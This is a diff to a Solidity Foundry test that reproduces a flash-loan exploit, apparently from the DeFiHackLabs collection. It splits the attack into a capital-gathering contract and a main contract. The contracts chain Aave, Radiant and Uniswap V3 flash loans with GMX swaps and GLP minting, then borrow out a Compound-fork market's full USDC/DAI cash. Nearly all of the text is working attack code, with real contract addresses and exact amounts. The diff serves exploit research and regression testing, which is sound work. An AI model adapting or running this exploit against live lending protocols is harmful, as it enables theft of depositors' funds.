@@ -44,6 +44,7 @@ interface GlpDepositor {
 
 interface IContinueFromCapital {
     function continueFromCapital() external;
+    function pullToken(address token, uint256 amount) external;
 }
 
 // Split out of ContractTest solely to keep the main exploit contract's runtime
@@ -109,9 +110,9 @@ contract CapitalGatherer {
     uniswapV3Flash UniV3Flash2 = uniswapV3Flash(0x50450351517117Cb58189edBa6bbaD6284D45902);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0x905dfCD5649217c42684f23958568e533C711Aa3);
     GMXRouter Router = GMXRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);
-    address main;
+    address payable main;
 
-    function gather(address _main) external {
+    function gather(address payable _main) external {
         main = _main;
         address[] memory assets = new address[](3);
         assets[0] = address(USDC);
@@ -146,10 +147,23 @@ contract CapitalGatherer {
             uint256[] memory m2 = new uint256[](1);
             m2[0] = 0;
             Radiant.flashLoan(address(this), a2, amt2, m2, address(0), new bytes(1), 0);
+            // AaveFlash pulls amounts[i]+premiums[i] per asset once this
+            // returns true. By now `continueFromCapital()` has already run
+            // (deep inside the nested calls above) so ContractTest holds the
+            // Compound-fork market's full USDC/DAI cash -- pull exactly what
+            // AAVE will pull. WETH is NOT pulled here: ContractTest never
+            // borrows a WETH market, but CapitalGatherer's own USDC->WETH
+            // swap below (unchanged from the original single-contract flow)
+            // already produces enough WETH for this repay + UniV3Flash1's.
+            IContinueFromCapital(main).pullToken(address(USDC), amounts[0] + premiums[0]);
+            IContinueFromCapital(main).pullToken(address(DAI), amounts[2] + premiums[2]);
             return true;
         } else if (msg.sender == address(Radiant)) {
             USDC.approve(address(Radiant), type(uint256).max);
             UniV3Flash1.flash(address(this), 5460 * 1e18, 7_170_000 * 1e6, new bytes(1));
+            // Radiant pulls amounts[0]+premiums[0] once this returns true --
+            // same reasoning as the AaveFlash branch above.
+            IContinueFromCapital(main).pullToken(address(USDC), amounts[0] + premiums[0]);
             return true;
         }
     }
@@ -157,15 +171,32 @@ contract CapitalGatherer {
     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
         if (msg.sender == address(UniV3Flash1)) {
             UniV3Flash2.flash(address(this), 0, 2_200_000 * 1e6, new bytes(1));
+            IContinueFromCapital(main).pullToken(address(USDC), 7_173_631 * 1e6);
             USDC.transfer(address(UniV3Flash1), 7_173_631 * 1e6);
+            // In the original single-contract flow this swap's 19,012,632 USDC
+            // came from the same contract's own organic balance (accumulated
+            // across the earlier Aave/Radiant/UniV3Flash1/2 loans). Here that
+            // balance was already forwarded to ContractTest in uniswapV2Call,
+            // so pull it back the same way as every other later repay.
+            IContinueFromCapital(main).pullToken(address(USDC), 19_012_632 * 1e6);
             USDC.approve(address(Router), 19_012_632 * 1e6);
             address[] memory path = new address[](2);
             path[0] = address(USDC);
             path[1] = address(WETH);
             Router.swap(path, 19_012_632 * 1e6, 8000 * 1e18, address(this));
+            // In the original single-contract flow, this swap's real output
+            // (~14,870.12 WETH, confirmed by direct instrumentation) is short
+            // of covering BOTH this repay (5463) AND AaveFlash's later WETH
+            // pull (9504.75) by ~97.63 WETH -- the gap is covered by the 125
+            // ether WETH re-wrap deep inside ContractTest's executeOperation
+            // (`address(WETH).call{value: 125 ether}("")`), which lands on
+            // THIS contract in the original (single-contract) version. Here
+            // that re-wrap happens on ContractTest instead, so pull it back.
+            IContinueFromCapital(main).pullToken(address(WETH), 125 * 1e18);
             WETH.transfer(address(UniV3Flash1), 5463 * 1e18);
         } else if (msg.sender == address(UniV3Flash2)) {
             Pair.swap(0, 10_000_000 * 1e6, address(this), new bytes(1));
+            IContinueFromCapital(main).pullToken(address(USDC), 2_201_111 * 1e6);
             USDC.transfer(address(UniV3Flash2), 2_201_111 * 1e6);
         }
     }
@@ -178,6 +209,11 @@ contract CapitalGatherer {
         Router.swapETHToTokens{value: 14_960 ether}(path, 18_890_000 * 1e6, address(this)); // 14,960 WETH for 19,001,512 USDC
         USDC.transfer(main, USDC.balanceOf(address(this)));
         DAI.transfer(main, DAI.balanceOf(address(this)));
+        // Forward the remaining native ETH (this contract's WETH.withdraw()
+        // above is the only source of it) -- ContractTest needs 1580 ether of
+        // it later to forward into GlpMintHelper.mintAndStakeGlpETH, plus 125
+        // ether for the final WETH re-wrap in executeOperation.
+        main.transfer(address(this).balance);
         IContinueFromCapital(main).continueFromCapital();
         USDC.transfer(address(Pair), 10_030_500 * 1e6);
     }
@@ -239,7 +275,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        capitalGatherer.gather(address(this));
+        capitalGatherer.gather(payable(address(this)));
     }
 
     // Called by CapitalGatherer mid-flash-swap once it holds the gathered
@@ -260,7 +296,23 @@ contract ContractTest is Test {
         }
         lplvGLP.borrow(PlvGlpTokenAmount);
         UniV3Flash3.flash(address(this), 397_054 * 1e6, 1_609_646 * 1e6, new bytes(1));
-        USDC.transfer(msg.sender, 10_030_500 * 1e6); // hand the PairV2 flash-swap repay back to CapitalGatherer
+        // Hand back enough USDC for CapitalGatherer to make the PairV2
+        // flash-swap repay it does INSIDE uniswapV2Call, right after this
+        // call returns. Every OTHER repay further up CapitalGatherer's call
+        // stack (UniV3Flash2, UniV3Flash1, Radiant, AaveFlash) pulls its own
+        // exact amount on-demand via `pullToken` right before it's needed --
+        // see CapitalGatherer's executeOperation/uniswapV3FlashCallback.
+        USDC.transfer(msg.sender, 10_030_500 * 1e6);
+    }
+
+    // Generic pull for CapitalGatherer's later-in-the-callstack repays
+    // (UniV3Flash1/2, Radiant, AaveFlash) -- all of which happen chronologically
+    // AFTER `continueFromCapital()` above has already run `borrowAll()`, so
+    // this contract always holds enough of any Compound-fork-borrowed asset by
+    // the time a pull request arrives, regardless of call order.
+    function pullToken(address token, uint256 amount) external {
+        require(msg.sender == address(capitalGatherer));
+        IERC20(token).transfer(msg.sender, amount);
     }
 
     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
@@ -290,6 +342,19 @@ contract ContractTest is Test {
         USDC.transfer(address(helper), usdcAmt);
         DAI.transfer(address(helper), daiAmt);
         USDT.transfer(address(helper), usdtAmt);
+        // The original single-contract DeFiHackLabs reproduction spends 1580
+        // ether here (Reward.mintAndStakeGlpETH) plus 125 ether later (the
+        // final WETH re-wrap) with NO corresponding capital-gathering step for
+        // either amount anywhere in the whole flow -- it silently relies on
+        // Foundry's default test-contract starting balance (type(uint96).max
+        // wei, confirmed by instrumenting the original contract directly),
+        // which is a test-harness artifact with no on-chain equivalent. The
+        // recorder's exploit contract starts at 0 ETH, so this 1705 ether
+        // (1580 + 125) is funded here via the same WETH.withdraw() pattern
+        // already used elsewhere in this exact contract -- `setup.dealToken`
+        // mints the WETH out of thin air (mirroring what Foundry's default
+        // funding effectively did for free) and this unwraps it to native ETH.
+        WETH.withdraw(1705 ether);
         helper.mintAndDonate{value: 1580 ether}(fraxAmt, usdcAmt, daiAmt, usdtAmt);
 
         address[] memory cTokens = new address[](1);
